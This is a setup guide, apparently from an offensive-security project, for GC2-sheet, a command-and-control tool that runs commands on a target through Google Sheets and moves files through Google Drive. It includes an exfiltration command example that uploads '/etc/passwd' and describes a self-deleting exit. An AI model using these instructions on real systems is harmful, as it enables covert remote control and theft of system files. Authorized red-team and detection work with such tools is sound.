# Google Sheets C2 Setup

## Recignition

GC2-sheet was one of the first SaaS C2's that I ran across and wanted to intigrate looCiprian's version as a tribute.
[looCiprian/GC2-sheet](<https://github.com/looCiprian/GC2-sheet>)  

Feel free to support thier hard work
[paypal link](<https://www.paypal.com/donate?hosted_button_id=8EWYXPED4ZU5E>)

## Requirements

- Google Workspace Account

## Set up

1. **Create a new Google "service account"**

    Create a new Google "service account" using [https://console.cloud.google.com/](https://console.cloud.google.com/), create a .json key file for the service account 

2. **Enable Google Sheet API and Google Drive API**

    Enable Google Drive API [https://developers.google.com/drive/api/v3/enable-drive-api](https://developers.google.com/drive/api/v3/enable-drive-api) and Google Sheet API [https://developers.google.com/sheets/api/quickstart/go](https://developers.google.com/sheets/api/quickstart/go) 

3. **Set up Google Sheet and Google Drive**

    Create a new Google Sheet and add the service account to the editor group of the spreadsheet (to add the service account use its email)

    <p align="center">
        <img alt="Sheet Permission" src="img/sheet_permissions.png" height="60%" width="60%">
    </p>

    Create a new Google Drive folder and add the service account to the editor group of the folder (to add the service account use its email)

    <p align="center">
        <img alt="Sheet Permission" src="img/drive_permissions.png" height="60%" width="60%">
    </p>

4. **Download the C2**

    The C2 can be cloned directly from GitHub:

    ```
    git clone https://github.com/looCiprian/GC2-sheet
    cd GC2-sheet
    ```

## Features

- Command execution using Google Sheet as a console
- Download files on the target using Google Drive
- Data exfiltration using Google Drive
- Exit

### Command execution

The program will perform a request to the spreedsheet every 5 sec to check if there are some new commands.
Commands must be inserted in column `A`, and the output will be printed in the column `B`. 

### Data exfiltration file

Special commands are reserved to perform the upload and download to the target machine

 ```none
From Target to Google Drive
upload;<remote path>
Example:
upload;/etc/passwd
 ```

### Download file

Special commands are reserved to perform the upload and download to the target machine

 ```none
 From Google Drive to Target
download;<google drive file id>;<remote path>
Example:
download;<file ID>;/home/user/downloaded.txt
 ```

### Exit

By sending the command *exit*, the program will delete itself from the target and kill its process

PS: From *os* documentation: 
*If a symlink was used to start the process, depending on the operating system, the result might be the symlink or the path it pointed to*. In this case, the symlink is deleted.

## Workflow

<p align="center">
  <img alt="Work Flow" src="img/GC2-workflow.png" height="60%" width="60%">
</p>

## Demo

[Demo](https://youtu.be/n2dFlSaBBKo)

[Demo](https://youtu.be/pLfuZnLcR1o) by [Grant Collins](https://www.youtube.com/@collinsinfosec)

## Disclaimer

The owner of this project is not responsible for any illegal usage of this program.

This is an open source project meant to be used with authorization to assess the security posture and for research purposes.

The final user is solely responsible for their actions and decisions. The use of this project is at your own risk. The owner of this project does not accept any liability for any loss or damage caused by the use of this project.

## Support the project

**Pull request** or [![paypal](<https://www.paypalobjects.com/en_US/i/btn/btn_donate_SM.gif)](https://www.paypal.com/donate?hosted_button_id=8EWYXPED4ZU5E>)
